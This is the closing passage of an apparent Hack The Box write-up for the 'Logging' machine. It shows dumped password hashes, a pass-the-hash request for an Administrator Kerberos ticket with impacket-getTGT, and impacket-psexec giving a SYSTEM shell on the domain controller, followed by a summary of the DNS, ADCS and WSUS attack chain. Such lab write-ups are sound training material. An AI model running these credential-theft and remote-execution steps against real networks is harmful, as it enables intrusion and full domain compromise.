Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
....
```

Using the recovered hash, I requested a Kerberos TGT for `Administrator`, and the resulting ticket was loaded into the Kerberos credential cache.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ impacket-getTGT logging.htb/Administrator -hashes ':a0c1d1bed9126632f5f1f2b3f790bdb5'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

After obtaining the Administrator TGT, I used `impacket-psexec` to authenticate to the domain controller and gain an interactive shell with full administrative privileges.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ impacket-psexec -k -no-pass 'LOGGING.HTB/Administrator@dc01.logging.htb'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc01.logging.htb.....
[*] Found writable share ADMIN$
[*] Uploading file oSWKnvfr.exe
[*] Opening SVCManager on dc01.logging.htb.....
[*] Creating service EbXp on dc01.logging.htb.....
[*] Starting service EbXp.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.8644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
 
C:\Windows\system32> whoami
nt authority\system
```

This completed the privilege escalation chain. By combining DNS abuse, ADCS certificate enrollment, and WSUS impersonation, it was possible to obtain Domain Admin privileges and ultimately achieve `NT AUTHORITY\SYSTEM` access on the domain controller. The root flag could then be retrieved from `C:\Users\toby.brynleigh\Desktop\root.txt`.

## Conclusion

This machine showcased a complete Active Directory compromise through the abuse of Kerberos, ADCS, DNS, and WSUS. After obtaining access as `jaylee.clifton`, I discovered DNS write permissions and a vulnerable certificate template that allowed me to impersonate the trusted WSUS server. By combining DNS hijacking with a rogue HTTPS WSUS service, I executed a malicious update that elevated the `MSA_HEALTH$` account to Domain Admin privileges.

From there, I extracted domain credentials, obtained the Administrator Kerberos ticket, and used `psexec.py` to gain a `NT AUTHORITY\SYSTEM` shell on the domain controller, ultimately achieving full domain compromise and retrieving the root flag.
